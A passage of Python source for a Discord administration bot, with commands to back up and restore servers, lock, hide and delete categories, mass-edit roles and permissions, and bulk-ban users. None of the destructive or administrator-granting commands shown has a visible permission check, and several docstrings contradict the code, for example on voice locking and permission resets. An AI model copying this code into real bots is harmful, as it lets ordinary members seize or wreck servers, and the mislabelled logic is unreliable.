             "slowmode": getattr(ch,"slowmode_delay",0)}
            for ch in cat.channels]} for cat in g.categories],
        "loose": [{"name": ch.name, "type": str(ch.type),
                   "nsfw": getattr(ch,"nsfw",False)}
                  for ch in g.channels
                  if ch.category is None and not isinstance(ch, discord.CategoryChannel)],
    }
    _save_backups()
    e = discord.Embed(title="💾 Backup Created", description=f"`{bid}`",
                      color=0x57f287, timestamp=datetime.datetime.now(datetime.UTC))
    b = _backups[bid]
    e.add_field(name="Guild",      value=g.name,                      inline=True)
    e.add_field(name="Roles",      value=len(b["roles"]),             inline=True)
    e.add_field(name="Categories", value=len(b["categories"]),        inline=True)
    e.set_footer(text=f"Restore with: !restore {bid}")
    await ctx.send(embed=e)

@bot.command()
async def backuplist(ctx):
    """List all saved server backups."""
    if not _backups:
        await ctx.send("💾 No backups saved."); return
    lines = [f"`{bid}` — **{b['label']}** ({b['created_at'][:10]}) by {b['created_by']}"
             for bid, b in list(_backups.items())[-15:]]
    e = discord.Embed(title=f"💾 Saved Backups ({len(_backups)})",
                      description="\n".join(lines), color=0x57f287)
    await ctx.send(embed=e)

@bot.command()
async def backupdelete(ctx, backup_id: str):
    """Delete a backup entry."""
    if backup_id not in _backups:
        await ctx.send(f"❌ `{backup_id}` not found."); return
    del _backups[backup_id]; _save_backups()
    await ctx.send(f"✅ Backup `{backup_id}` deleted.")

@bot.command()
async def restore(ctx, backup_id: str):
    """Recreate channels and roles from a backup (additive — does not delete existing)."""
    b = _backups.get(backup_id)
    if not b:
        await ctx.send(f"❌ Backup `{backup_id}` not found."); return
    await ctx.send(f"♻️ Restoring **{b['label']}** from backup `{backup_id}`…")
    g = ctx.guild
    for rd in reversed(b["roles"]):
        await safe(g.create_role(name=rd["name"], color=discord.Color(rd["color"]),
                                 hoist=rd["hoist"], mentionable=rd["mentionable"],
                                 permissions=discord.Permissions(rd["permissions"])))
    for cd in b["categories"]:
        cat = await safe(g.create_category(cd["name"]))
        for chd in cd.get("channels", []):
            if "voice" in chd.get("type",""):
                await safe(g.create_voice_channel(chd["name"], category=cat))
            else:
                await safe(g.create_text_channel(chd["name"], category=cat,
                    topic=chd.get("topic",""), nsfw=chd.get("nsfw",False),
                    slowmode_delay=chd.get("slowmode",0)))
    for chd in b.get("loose", []):
        if "voice" in chd.get("type",""):
            await safe(g.create_voice_channel(chd["name"]))
        else:
            await safe(g.create_text_channel(chd["name"], nsfw=chd.get("nsfw",False)))
    await ctx.send(f"✅ Restore complete for backup `{backup_id}`.")
    await _log_embed(_action_embed("♻️ Server Restored from Backup", 0x57f287,
        [("Backup", backup_id, True), ("Label", b["label"], True), ("By", str(ctx.author), True)]))

# ═══════════════════════════════════════════════════════════════════
# EXTENDED CHANNEL COMMANDS
# ═══════════════════════════════════════════════════════════════════

@bot.command()
async def chperms(ctx, channel: discord.abc.GuildChannel = None):
    """Show all permission overwrites for a channel."""
    ch = channel or ctx.channel
    if not ch.overwrites:
        await ctx.send(f"📋 No overwrites on **{ch.name}**."); return
    lines = []
    for target, overwrite in ch.overwrites.items():
        allows, denies = overwrite.pair()
        lines.append(f"**{target.name}** — ✅ `{allows.value}` ❌ `{denies.value}`")
    e = discord.Embed(title=f"🔐 Overwrites: #{ch.name}",
                      description="\n".join(lines), color=0x5865F2)
    await ctx.send(embed=e)

@bot.command()
async def syncall(ctx):
    """Sync all channels to their category's permission settings."""
    targets = [ch for ch in ctx.guild.channels
               if ch.category and not isinstance(ch, discord.CategoryChannel)]
    await batch([ch.edit(sync_permissions=True) for ch in targets], **BATCH_CH)
    await _rich_status(ctx, f"🔄 Synced {len(targets)} channels to their categories", 0x5865F2)

@bot.command()
async def unsyncall(ctx):
    """Unsync all channels from their category permissions."""
    targets = [ch for ch in ctx.guild.channels
               if ch.category and not isinstance(ch, discord.CategoryChannel)]
    await batch([ch.edit(sync_permissions=False) for ch in targets], **BATCH_CH)
    await _rich_status(ctx, f"🔄 Unsynced {len(targets)} channels", 0x5865F2)

@bot.command()
async def lockcat(ctx, category: discord.CategoryChannel):
    """Lock all text channels in a category for @everyone."""
    overwrite = discord.PermissionOverwrite(send_messages=False, add_reactions=False)
    targets   = [ch for ch in category.channels if isinstance(ch, discord.TextChannel)]
    await batch([ch.set_permissions(ctx.guild.default_role, overwrite=overwrite)
                 for ch in targets], **BATCH_CH)
    await _rich_status(ctx, f"🔒 Locked {len(targets)} channels in {category.name}", 0xffa500,
                       Category=category.name, Channels=len(targets))

@bot.command()
async def unlockcat(ctx, category: discord.CategoryChannel):
    """Unlock all text channels in a category."""
    targets = [ch for ch in category.channels if isinstance(ch, discord.TextChannel)]
    await batch([ch.set_permissions(ctx.guild.default_role, send_messages=True, add_reactions=True)
                 for ch in targets], **BATCH_CH)
    await _rich_status(ctx, f"🔓 Unlocked {len(targets)} channels in {category.name}", 0x57f287)

@bot.command()
async def hidecat(ctx, category: discord.CategoryChannel):
    """Hide a category from @everyone."""
    await batch(
        [ch.set_permissions(ctx.guild.default_role, view_channel=False) for ch in category.channels]
        + [safe(category.set_permissions(ctx.guild.default_role, view_channel=False))],
        **BATCH_CH)
    await _rich_status(ctx, f"🙈 Hidden category: {category.name}", 0x2f3136)

@bot.command()
async def showcat(ctx, category: discord.CategoryChannel):
    """Show a category to @everyone."""
    await batch(
        [ch.set_permissions(ctx.guild.default_role, view_channel=True) for ch in category.channels]
        + [safe(category.set_permissions(ctx.guild.default_role, view_channel=True))],
        **BATCH_CH)
    await _rich_status(ctx, f"👁️ Shown category: {category.name}", 0x57f287)

@bot.command()
async def nsfwcat(ctx, category: discord.CategoryChannel):
    """Mark all text channels in a category NSFW."""
    targets = [ch for ch in category.channels if isinstance(ch, discord.TextChannel)]
    await batch([ch.edit(nsfw=True) for ch in targets], **BATCH_CH)
    await _rich_status(ctx, f"🔞 NSFW'd {len(targets)} channels in {category.name}", 0xff0000)

@bot.command()
async def unnsfwcat(ctx, category: discord.CategoryChannel):
    """Remove NSFW from all channels in a category."""
    targets = [ch for ch in category.channels if isinstance(ch, discord.TextChannel)]
    await batch([ch.edit(nsfw=False) for ch in targets], **BATCH_CH)
    await _rich_status(ctx, f"✅ Cleared NSFW from {len(targets)} channels", 0x57f287)

@bot.command()
async def slowcat(ctx, category: discord.CategoryChannel, seconds: int):
    """Set slowmode on all text channels in a category."""
    targets = [ch for ch in category.channels if isinstance(ch, discord.TextChannel)]
    await batch([ch.edit(slowmode_delay=seconds) for ch in targets], **BATCH_CH)
    await _rich_status(ctx, f"⏱️ Slowmode {seconds}s on {len(targets)} channels", 0xffd700)

@bot.command()
async def topiccat(ctx, category: discord.CategoryChannel, *, topic: str):
    """Set topic on all text channels in a category."""
    targets = [ch for ch in category.channels if isinstance(ch, discord.TextChannel)]
    await batch([ch.edit(topic=topic) for ch in targets], **BATCH_CH)
    await _rich_status(ctx, f"📝 Set topic on {len(targets)} channels", 0x5865F2)

@bot.command()
async def renamecat(ctx, category: discord.CategoryChannel, *, name: str):
    """Rename a specific category."""
    old = category.name
    await category.edit(name=name)
    await _rich_status(ctx, f"✏️ Renamed category", 0xffd700, Before=old, After=name)

@bot.command()
async def delcat(ctx, category: discord.CategoryChannel):
    """Delete a specific category and all channels in it."""
    n = len(category.channels)
    await asyncio.gather(*[safe(ch.delete()) for ch in category.channels])
    await safe(category.delete())
    await _rich_status(ctx, f"🗑️ Deleted category + {n} channels", 0xff0000, Category=category.name)

@bot.command()
async def clonecat(ctx, category: discord.CategoryChannel):
    """Clone a category and all its channels."""
    new_cat = await ctx.guild.create_category(f"{category.name}-clone")
    for ch in category.channels:
        if isinstance(ch, discord.TextChannel):
            await safe(ctx.guild.create_text_channel(ch.name, category=new_cat,
                topic=ch.topic or "", nsfw=ch.nsfw, slowmode_delay=ch.slowmode_delay))
        elif isinstance(ch, discord.VoiceChannel):
            await safe(ctx.guild.create_voice_channel(ch.name, category=new_cat))
    await _rich_status(ctx, f"📋 Cloned {category.name}", 0x57f287,
                       Original=category.name, Clone=new_cat.name, Channels=len(category.channels))

@bot.command()
async def countchannels(ctx):
    """Count all channels by type."""
    g = ctx.guild
    text  = len(g.text_channels)
    voice = len(g.voice_channels)
    cats  = len(g.categories)
    stage = len([c for c in g.channels if isinstance(c, discord.StageChannel)])
    total = len(g.channels)
    e = discord.Embed(title="📊 Channel Counts", color=0x5865F2)
    e.add_field(name="📝 Text",       value=text,  inline=True)
    e.add_field(name="🔊 Voice",      value=voice, inline=True)
    e.add_field(name="📁 Categories", value=cats,  inline=True)
    e.add_field(name="🎭 Stage",      value=stage, inline=True)
    e.add_field(name="📦 Total",      value=total, inline=True)
    await ctx.send(embed=e)

@bot.command()
async def listchbycat(ctx):
    """List all channels grouped by category."""
    lines = []
    for cat in ctx.guild.categories:
        lines.append(f"\n**📁 {cat.name}**")
        for ch in cat.channels:
            icon = "🔊" if isinstance(ch, discord.VoiceChannel) else "📝"
            lines.append(f"  {icon} {ch.name}")
    uncategorized = [ch for ch in ctx.guild.channels
                     if ch.category is None and not isinstance(ch, discord.CategoryChannel)]
    if uncategorized:
        lines.append("\n**📁 (No Category)**")
        for ch in uncategorized:
            lines.append(f"  📝 {ch.name}")
    text = "\n".join(lines)
    for chunk in [text[i:i+1900] for i in range(0, len(text), 1900)]:
        await ctx.send(f"```\n{chunk}\n```")

@bot.command()
async def chpos(ctx, channel: discord.abc.GuildChannel, position: int):
    """Set a channel's position in the sidebar."""
    await channel.edit(position=position)
    await _rich_status(ctx, f"📍 Moved {channel.name} to position {position}", 0x5865F2)

@bot.command()
async def readonlyall(ctx):
    """Make all channels read-only for @everyone."""
    ow = discord.PermissionOverwrite(send_messages=False, add_reactions=False, create_public_threads=False)
    targets = ctx.guild.text_channels
    await batch([ch.set_permissions(ctx.guild.default_role, overwrite=ow) for ch in targets], **BATCH_CH)
    await _rich_status(ctx, f"🔒 Made {len(targets)} channels read-only", 0xff0000)

@bot.command()
async def nopermsall(ctx):
    """Remove ALL permission overwrites for @everyone on every channel."""
    targets = [ch for ch in ctx.guild.channels if not isinstance(ch, discord.CategoryChannel)]
    await batch([ch.set_permissions(ctx.guild.default_role,
                                    view_channel=False, send_messages=False,
                                    read_messages=False, add_reactions=False)
                 for ch in targets], **BATCH_CH)
    await _rich_status(ctx, f"🚫 Removed @everyone perms on {len(targets)} channels", 0xff0000)

@bot.command()
async def fullpermsall(ctx):
    """Give @everyone all permissions on every channel."""
    targets = [ch for ch in ctx.guild.channels if not isinstance(ch, discord.CategoryChannel)]
    await batch([ch.set_permissions(ctx.guild.default_role, overwrite=None) for ch in targets], **BATCH_CH)
    await _rich_status(ctx, f"✅ Reset @everyone overwrites on {len(targets)} channels", 0x57f287)

@bot.command()
async def moveall(ctx, category: discord.CategoryChannel):
    """Move ALL non-category channels into one category."""
    targets = [ch for ch in ctx.guild.channels
               if not isinstance(ch, discord.CategoryChannel) and ch.category != category]
    await batch([ch.edit(category=category) for ch in targets], **BATCH_CH)
    await _rich_status(ctx, f"📦 Moved {len(targets)} channels to {category.name}", 0x5865F2)

@bot.command()
async def listwebhookall(ctx):
    """List ALL webhooks across every channel."""
    lines = []
    for ch in ctx.guild.text_channels:
        try:
            whs = await ch.webhooks()
            for wh in whs:
                lines.append(f"#{ch.name} — **{wh.name}** `{wh.id}`")
        except Exception:
            pass
    if not lines:
        await ctx.send("📋 No webhooks found."); return
    text = "\n".join(lines)
    for chunk in [text[i:i+1900] for i in range(0, len(text), 1900)]:
        await safe(ctx.send(f"```\n{chunk}\n```"))

@bot.command()
async def chinfo(ctx, channel: discord.abc.GuildChannel = None):
    """Detailed info embed for a channel."""
    ch = channel or ctx.channel
    e = discord.Embed(title=f"📋 #{ch.name}", color=0x5865F2)
    e.add_field(name="ID",       value=f"`{ch.id}`",                             inline=True)
    e.add_field(name="Type",     value=str(ch.type),                             inline=True)
    e.add_field(name="Category", value=ch.category.name if ch.category else "None", inline=True)
    e.add_field(name="Position", value=ch.position,                              inline=True)
    e.add_field(name="Created",  value=ch.created_at.strftime("%Y-%m-%d"),       inline=True)
    if isinstance(ch, discord.TextChannel):
        e.add_field(name="NSFW",     value=ch.nsfw,               inline=True)
        e.add_field(name="Slowmode", value=f"{ch.slowmode_delay}s", inline=True)
        e.add_field(name="Topic",    value=ch.topic or "None",    inline=False)
    elif isinstance(ch, discord.VoiceChannel):
        e.add_field(name="Bitrate",   value=f"{ch.bitrate//1000}kbps", inline=True)
        e.add_field(name="User Limit", value=ch.user_limit or "∞",    inline=True)
        e.add_field(name="Members",    value=len(ch.members),          inline=True)
    await ctx.send(embed=e)

@bot.command()
async def firstmsg(ctx, channel: discord.TextChannel = None):
    """Get a link to the very first message in a channel."""
    ch = channel or ctx.channel
    msgs = [m async for m in ch.history(limit=1, oldest_first=True)]
    if msgs:
        await ctx.send(f"📜 First message: {msgs[0].jump_url}")
    else:
        await ctx.send("❌ No messages found.")

@bot.command()
async def lastmsg(ctx, channel: discord.TextChannel = None):
    """Get a link to the most recent message in a channel."""
    ch = channel or ctx.channel
    msgs = [m async for m in ch.history(limit=1)]
    if msgs:
        await ctx.send(f"📜 Last message: {msgs[0].jump_url}")
    else:
        await ctx.send("❌ No messages found.")

@bot.command()
async def emptychannels(ctx):
    """List text channels with no pinned messages and very low activity."""
    empty = []
    for ch in ctx.guild.text_channels:
        try:
            msgs = [m async for m in ch.history(limit=1)]
            if not msgs:
                empty.append(ch.mention)
        except Exception:
            pass
    if not empty:
        await ctx.send("✅ No completely empty channels found."); return
    e = discord.Embed(title=f"📭 Empty Channels ({len(empty)})",
                      description="\n".join(empty[:40]), color=0x99aab5)
    await ctx.send(embed=e)

@bot.command()
async def invitecustom(ctx, channel: discord.TextChannel = None, max_uses: int = 0, max_age: int = 0):
    """Create a custom invite with optional usage/age limits."""
    ch = channel or ctx.channel
    inv = await ch.create_invite(max_uses=max_uses, max_age=max_age, unique=True)
    e = discord.Embed(title="🔗 Custom Invite Created", color=0x57f287)
    e.add_field(name="Link",      value=inv.url,           inline=False)
    e.add_field(name="Channel",   value=ch.mention,        inline=True)
    e.add_field(name="Max Uses",  value=max_uses or "∞",  inline=True)
    e.add_field(name="Max Age",   value=f"{max_age}s" if max_age else "∞", inline=True)
    await ctx.send(embed=e)

@bot.command()
async def vcmoveall(ctx, source: discord.VoiceChannel, dest: discord.VoiceChannel):
    """Move all members from one voice channel to another."""
    targets = list(source.members)
    if not targets:
        await ctx.send(f"❌ No members in {source.name}."); return
    await batch([m.move_to(dest) for m in targets], **BATCH_MBR)
    await _rich_status(ctx, f"🔀 Moved {len(targets)} members", 0x5865F2,
                       From=source.name, To=dest.name)

@bot.command()
async def vckick(ctx, member: discord.Member):
    """Disconnect a member from their voice channel."""
    if not member.voice:
        await ctx.send(f"❌ {member.mention} is not in a voice channel."); return
    await member.move_to(None)
    await ctx.send(f"🦶 Disconnected {member.mention} from voice.")

@bot.command()
async def vclock(ctx, vc: discord.VoiceChannel):
    """Lock a voice channel by setting user limit to 0 (no one can join)."""
    await vc.edit(user_limit=0)
    await _rich_status(ctx, f"🔒 VC locked: {vc.name}", 0xff0000, Channel=vc.name, Limit="0 (full)")

@bot.command()
async def vcunlock(ctx, vc: discord.VoiceChannel):
    """Remove user limit from a voice channel."""
    await vc.edit(user_limit=0)
    # Remove the limit by setting to 0 which means unlimited
    await vc.edit(user_limit=None if hasattr(vc, 'user_limit') else 0)
    await _rich_status(ctx, f"🔓 VC unlocked: {vc.name}", 0x57f287)

@bot.command()
async def vcstatus(ctx, vc: discord.VoiceChannel = None):
    """Show detailed voice channel status."""
    ch = vc or (ctx.author.voice.channel if ctx.author.voice else None)
    if not ch:
        await ctx.send("❌ Specify a voice channel or join one."); return
    e = discord.Embed(title=f"🔊 {ch.name}", color=0x5865F2)
    e.add_field(name="Members",    value=f"{len(ch.members)}/{ch.user_limit or '∞'}", inline=True)
    e.add_field(name="Bitrate",    value=f"{ch.bitrate//1000}kbps",                  inline=True)
    e.add_field(name="Region",     value=str(ch.rtc_region or "auto"),               inline=True)
    e.add_field(name="Category",   value=ch.category.name if ch.category else "None",  inline=True)
    e.add_field(name="ID",         value=f"`{ch.id}`",                               inline=True)
    if ch.members:
        e.add_field(name="In Channel",
                    value="\n".join(str(m) for m in ch.members[:10])[:1024], inline=False)
    await ctx.send(embed=e)

@bot.command()
async def vclockall(ctx):
    """Lock all voice channels (set user limit to 1)."""
    vcs = ctx.guild.voice_channels
    await batch([vc.edit(user_limit=1) for vc in vcs], **BATCH_CH)
    await _rich_status(ctx, f"🔒 Locked {len(vcs)} voice channels", 0xff0000)

@bot.command()
async def vcunlockall(ctx):
    """Remove user limit from all voice channels."""
    vcs = ctx.guild.voice_channels
    await batch([vc.edit(user_limit=0) for vc in vcs], **BATCH_CH)
    await _rich_status(ctx, f"🔓 Unlocked {len(vcs)} voice channels", 0x57f287)

@bot.command()
async def vcrename(ctx, vc: discord.VoiceChannel, *, name: str):
    """Rename a voice channel."""
    old = vc.name
    await vc.edit(name=name)
    await _rich_status(ctx, f"✏️ VC renamed", 0xffd700, Before=old, After=name)

@bot.command()
async def vcmembers(ctx, vc: discord.VoiceChannel = None):
    """List members currently in a voice channel."""
    ch = vc or (ctx.author.voice.channel if ctx.author.voice else None)
    if not ch:
        await ctx.send("❌ Specify a VC or join one."); return
    if not ch.members:
        await ctx.send(f"🔇 Nobody in **{ch.name}**."); return
    e = discord.Embed(title=f"🔊 {ch.name} — {len(ch.members)} members", color=0x5865F2)
    e.description = "\n".join(
        f"{m.mention} {'🎙️' if m.voice.self_mute else ''} {'🔇' if m.voice.mute else ''}"
        for m in ch.members)
    await ctx.send(embed=e)

# ═══════════════════════════════════════════════════════════════════
# EXTENDED ROLE COMMANDS
# ═══════════════════════════════════════════════════════════════════

@bot.command()
async def roleperms(ctx, role: discord.Role):
    """List all permissions a role has."""
    perms = [p for p, v in role.permissions if v]
    denied = [p for p, v in role.permissions if not v]
    e = discord.Embed(title=f"🔐 Permissions: @{role.name}", color=role.color)
    e.add_field(name="✅ Allowed", value="\n".join(perms[:20])  or "None", inline=True)
    e.add_field(name="❌ Denied",  value="\n".join(denied[:20]) or "None", inline=True)
    await ctx.send(embed=e)

@bot.command()
async def addroleperm(ctx, role: discord.Role, *, perm: str):
    """Add a permission to a role."""
    perm = perm.lower().replace(" ", "_")
    perms = role.permissions
    try:
        setattr(perms, perm, True)
        await role.edit(permissions=perms)
        await _rich_status(ctx, f"✅ Added `{perm}` to @{role.name}", 0x57f287)
    except Exception as ex:
        await ctx.send(f"❌ Failed: `{ex}`")

@bot.command()
async def rmroleperm(ctx, role: discord.Role, *, perm: str):
    """Remove a permission from a role."""
    perm = perm.lower().replace(" ", "_")
    perms = role.permissions
    try:
        setattr(perms, perm, False)
        await role.edit(permissions=perms)
        await _rich_status(ctx, f"✅ Removed `{perm}` from @{role.name}", 0xffa500)
    except Exception as ex:
        await ctx.send(f"❌ Failed: `{ex}`")

@bot.command()
async def clearroleperms(ctx, role: discord.Role):
    """Remove ALL permissions from a role."""
    await role.edit(permissions=discord.Permissions.none())
    await _rich_status(ctx, f"🚫 Cleared all perms from @{role.name}", 0xff0000)

@bot.command()
async def fullroleperms(ctx, role: discord.Role):
    """Give a role ALL permissions (administrator)."""
    await role.edit(permissions=discord.Permissions.all())
    await _rich_status(ctx, f"⚡ Gave ALL perms to @{role.name}", 0xffd700, Warning="Role is now admin!")

@bot.command()
async def sortroles(ctx):
    """Sort all non-managed roles alphabetically."""
    managed = [r for r in ctx.guild.roles if r.managed or r.is_default()]
    sortable = sorted([r for r in ctx.guild.roles if not r.managed and not r.is_default()],
                      key=lambda r: r.name.lower())
    pos = 1
    for r in sortable:
        await safe(r.edit(position=pos)); pos += 1
    await _rich_status(ctx, f"🔤 Sorted {len(sortable)} roles alphabetically", 0x5865F2)

@bot.command()
async def rolemembers(ctx, role: discord.Role, show: int = 30):
    """List all members with a specific role."""
    members = role.members
    if not members:
        await ctx.send(f"📋 No members have @{role.name}."); return
    e = discord.Embed(title=f"👥 Members with @{role.name} ({len(members)})", color=role.color)
    e.description = "\n".join(str(m) for m in members[:show])
    if len(members) > show:
        e.set_footer(text=f"Showing {show} of {len(members)}")
    await ctx.send(embed=e)

@bot.command()
async def rolecount(ctx, role: discord.Role):
    """Show how many members have a specific role."""
    n = len(role.members)
    await ctx.send(f"👥 **{n}** member(s) have {role.mention}.")

@bot.command()
async def duprole(ctx, role: discord.Role, *, name: str):
    """Duplicate a role with a new name."""
    new = await ctx.guild.create_role(name=name, color=role.color, hoist=role.hoist,
                                      mentionable=role.mentionable, permissions=role.permissions)
    await _rich_status(ctx, f"📋 Duplicated role", 0x57f287, Original=role.name, Clone=new.name)

@bot.command()
async def roleposition(ctx, role: discord.Role, position: int):
    """Set a role's position in the hierarchy."""
    await role.edit(position=position)
    await _rich_status(ctx, f"📍 Moved @{role.name} to position {position}", 0x5865F2)

@bot.command()
async def emptyroles(ctx):
    """List roles with zero members."""
    empty = [r for r in ctx.guild.roles if not r.members and not r.is_default() and not r.managed]
    if not empty:
        await ctx.send("✅ All roles have at least one member."); return
    e = discord.Embed(title=f"📭 Empty Roles ({len(empty)})",
                      description="\n".join(r.mention for r in empty[:30]), color=0x99aab5)
    await ctx.send(embed=e)

@bot.command()
async def adminroles(ctx):
    """List all roles with administrator permission."""
    admins = [r for r in ctx.guild.roles if r.permissions.administrator]
    if not admins:
        await ctx.send("✅ No admin roles."); return
    e = discord.Embed(title=f"👑 Admin Roles ({len(admins)})",
                      description="\n".join(f"{r.mention} — {len(r.members)} members" for r in admins),
                      color=0xffd700)
    await ctx.send(embed=e)

@bot.command()
async def botroles(ctx):
    """List all roles managed by bots/integrations."""
    bots = [r for r in ctx.guild.roles if r.managed]
    e = discord.Embed(title=f"🤖 Bot-Managed Roles ({len(bots)})",
                      description="\n".join(r.mention for r in bots) or "None", color=0x5865F2)
    await ctx.send(embed=e)

@bot.command()
async def copyroles(ctx, source: discord.Member, target: discord.Member):
    """Copy all roles from one member to another."""
    roles_to_add = [r for r in source.roles if not r.is_default() and not r.managed
                    and r < ctx.guild.me.top_role]
    await target.add_roles(*roles_to_add, reason=f"Copied from {source}")
    await _rich_status(ctx, f"📋 Copied {len(roles_to_add)} roles", 0x57f287,
                       From=str(source), To=str(target))

@bot.command()
async def giverole(ctx, role: discord.Role, member: discord.Member):
    """Give a role to a specific member."""
    await member.add_roles(role)
    await _rich_status(ctx, f"✅ Gave {role.name} to {member}", 0x57f287)

@bot.command()
async def takerole(ctx, role: discord.Role, member: discord.Member):
    """Remove a role from a specific member."""
    await member.remove_roles(role)
    await _rich_status(ctx, f"✅ Removed {role.name} from {member}", 0xffa500)

@bot.command()
async def massrolesadd(ctx, source_role: discord.Role, target_role: discord.Role):
    """Give target_role to all members who have source_role."""
    targets = [m for m in source_role.members if target_role not in m.roles]
    await batch([m.add_roles(target_role) for m in targets], **BATCH_MBR)
    await _rich_status(ctx, f"✅ Added {target_role.name} to {len(targets)} members", 0x57f287)

@bot.command()
async def randomrolecolor(ctx):
    """Randomize colors of all non-default, non-managed roles."""
    import random
    targets = [r for r in ctx.guild.roles if not r.is_default() and not r.managed]
    await batch([r.edit(color=discord.Color(random.randint(0, 0xFFFFFF))) for r in targets],
                **BATCH_ROLE)
    await _rich_status(ctx, f"🎨 Randomized {len(targets)} role colors", 0x57f287)

@bot.command()
async def selfassign(ctx, role: discord.Role):
    """Add a role to yourself."""
    if role >= ctx.guild.me.top_role:
        await ctx.send("❌ That role is too high for me to assign."); return
    await ctx.author.add_roles(role)
    await ctx.send(f"✅ Added {role.mention} to you.")

@bot.command()
async def selfremove(ctx, role: discord.Role):
    """Remove a role from yourself."""
    await ctx.author.remove_roles(role)
    await ctx.send(f"✅ Removed {role.mention} from you.")

@bot.command()
async def toproles(ctx, n: int = 10):
    """Show the top N highest roles."""
    roles = sorted([r for r in ctx.guild.roles if not r.is_default()],
                   key=lambda r: r.position, reverse=True)[:n]
    e = discord.Embed(title=f"🔝 Top {n} Roles", color=0x5865F2)
    e.description = "\n".join(
        f"`{r.position}` {r.mention} — {len(r.members)} members" for r in roles)
    await ctx.send(embed=e)

@bot.command()
async def delempyroles(ctx):
    """Delete all roles that have zero members."""
    targets = [r for r in ctx.guild.roles if not r.members and not r.is_default() and not r.managed
               and r < ctx.guild.me.top_role]
    sem = asyncio.Semaphore(10)
    async def _del(r):
        async with sem: await safe(r.delete())
    await asyncio.gather(*[_del(r) for r in targets])
    await _rich_status(ctx, f"🗑️ Deleted {len(targets)} empty roles", 0xff0000)

@bot.command()
async def massunrole(ctx, role: discord.Role):
    """Remove a specific role from every member who has it."""
    targets = list(role.members)
    await batch([m.remove_roles(role) for m in targets], **BATCH_MBR)
    await _rich_status(ctx, f"✅ Removed {role.name} from {len(targets)} members", 0xffa500)

# ═══════════════════════════════════════════════════════════════════
# EXTENDED MEMBER COMMANDS
# ═══════════════════════════════════════════════════════════════════

@bot.command()
async def stripone(ctx, member: discord.Member):
    """Remove all roles from a specific member."""
    roles = [r for r in member.roles if not r.is_default() and not r.managed
             and r < ctx.guild.me.top_role]
    await member.remove_roles(*roles, reason=f"Stripped by {ctx.author}")
    await _rich_status(ctx, f"✅ Stripped {len(roles)} roles from {member}", 0xff0000)

@bot.command()
async def giveallroles(ctx, member: discord.Member):
    """Give all non-default, non-managed roles to a member."""
    roles = [r for r in ctx.guild.roles if not r.is_default() and not r.managed
             and r < ctx.guild.me.top_role]
    await member.add_roles(*roles, reason=f"Mass-roled by {ctx.author}")
    await _rich_status(ctx, f"✅ Added {len(roles)} roles to {member}", 0x57f287)

@bot.command()
async def cloneuser(ctx, source: discord.Member, target: discord.Member):
    """Copy all roles from one member to another."""
    roles = [r for r in source.roles if not r.is_default() and not r.managed
             and r < ctx.guild.me.top_role]
    await target.add_roles(*roles)
    await _rich_status(ctx, f"📋 Cloned {len(roles)} roles", 0x57f287,
                       From=str(source), To=str(target))

@bot.command()
async def botmembers(ctx):
    """List all bots in the server."""
    bots = [m for m in ctx.guild.members if m.bot]
    e = discord.Embed(title=f"🤖 Bots ({len(bots)})", color=0x5865F2)
    e.description = "\n".join(f"{m.mention} `{m.id}`" for m in bots[:30]) or "None"
    await ctx.send(embed=e)

@bot.command()
async def humanmembers(ctx):
    """Count human (non-bot) members."""
    humans = [m for m in ctx.guild.members if not m.bot]
    await ctx.send(f"👥 **{len(humans)}** human members (out of {ctx.guild.member_count}).")

@bot.command()
async def onlinemembers(ctx):
    """List all currently online members."""
    online = [m for m in ctx.guild.members
              if m.status != discord.Status.offline and not m.bot]
    e = discord.Embed(title=f"🟢 Online Members ({len(online)})", color=0x57f287)
    e.description = "\n".join(str(m) for m in online[:30])
    if len(online) > 30:
        e.set_footer(text=f"Showing 30 of {len(online)}")
    await ctx.send(embed=e)

@bot.command()
async def offlinemembers(ctx):
    """List all offline members."""
    offline = [m for m in ctx.guild.members
               if m.status == discord.Status.offline and not m.bot]
    e = discord.Embed(title=f"⚫ Offline Members ({len(offline)})", color=0x99aab5)
    e.description = "\n".join(str(m) for m in offline[:30])
    if len(offline) > 30:
        e.set_footer(text=f"Showing 30 of {len(offline)}")
    await ctx.send(embed=e)

@bot.command()
async def recentjoins(ctx, n: int = 10):
    """Show the N most recently joined members."""
    members = sorted(ctx.guild.members, key=lambda m: m.joined_at or discord.utils.utcnow(),
                     reverse=True)[:n]
    e = discord.Embed(title=f"📥 Most Recent {n} Joins", color=0x57f287)
    e.description = "\n".join(
        f"{m.mention} — joined {(discord.utils.utcnow() - m.joined_at).days}d ago"
        if m.joined_at else str(m) for m in members)
    await ctx.send(embed=e)

@bot.command()
async def oldestmembers(ctx, n: int = 10):
    """Show the N longest-serving members."""
    members = sorted([m for m in ctx.guild.members if m.joined_at],
                     key=lambda m: m.joined_at)[:n]
    e = discord.Embed(title=f"🏆 Oldest {n} Members", color=0xffd700)
    e.description = "\n".join(
        f"{m.mention} — joined {m.joined_at.strftime('%Y-%m-%d')}" for m in members)
    await ctx.send(embed=e)

@bot.command()
async def newaccounts(ctx, days: int = 7):
    """List members whose Discord accounts are newer than X days."""
    cutoff = discord.utils.utcnow() - datetime.timedelta(days=days)
    new    = [m for m in ctx.guild.members if m.created_at > cutoff and not m.bot]
    e = discord.Embed(title=f"🆕 Accounts < {days} days old ({len(new)})", color=0xffa500)
    e.description = "\n".join(
        f"{m.mention} — created {(discord.utils.utcnow() - m.created_at).days}d ago"
        for m in new[:30])
    await ctx.send(embed=e)

@bot.command()
async def nickone(ctx, member: discord.Member, *, nick: str):
    """Change a specific member's nickname."""
    old = member.display_name
    await member.edit(nick=nick)
    await _rich_status(ctx, f"✏️ Renamed {member}", 0xffd700, Before=old, After=nick)

@bot.command()
async def resetnick(ctx, member: discord.Member):
    """Reset one member's nickname."""
    await member.edit(nick=None)
    await ctx.send(f"✅ Reset nickname for {member.mention}.")

@bot.command()
async def bulkban(ctx, *, ids: str):
    """Ban multiple user IDs at once. Separate with spaces or commas."""
    raw_ids = [i.strip().strip("<@!>") for i in ids.replace(",", " ").split()]
    success, fail = 0, 0
    for raw in raw_ids:
        try:
            await ctx.guild.ban(discord.Object(int(raw)), delete_message_days=0)
            success += 1
        except Exception:
            fail += 1
    await _rich_status(ctx, f"⚡ Bulk Ban complete", 0xff0000, Banned=success, Failed=fail)

@bot.command()
async def userperms(ctx, member: discord.Member, channel: discord.TextChannel = None):
    """Show effective permissions for a member (optionally in a channel)."""
    ch = channel or ctx.channel
    perms = ch.permissions_for(member)
    allowed = [p for p, v in perms if v]
    denied  = [p for p, v in perms if not v]
    e = discord.Embed(title=f"🔐 {member}'s perms in #{ch.name}", color=0x5865F2)
    e.add_field(name="✅ Allowed", value="\n".join(allowed[:15]) or "None", inline=True)
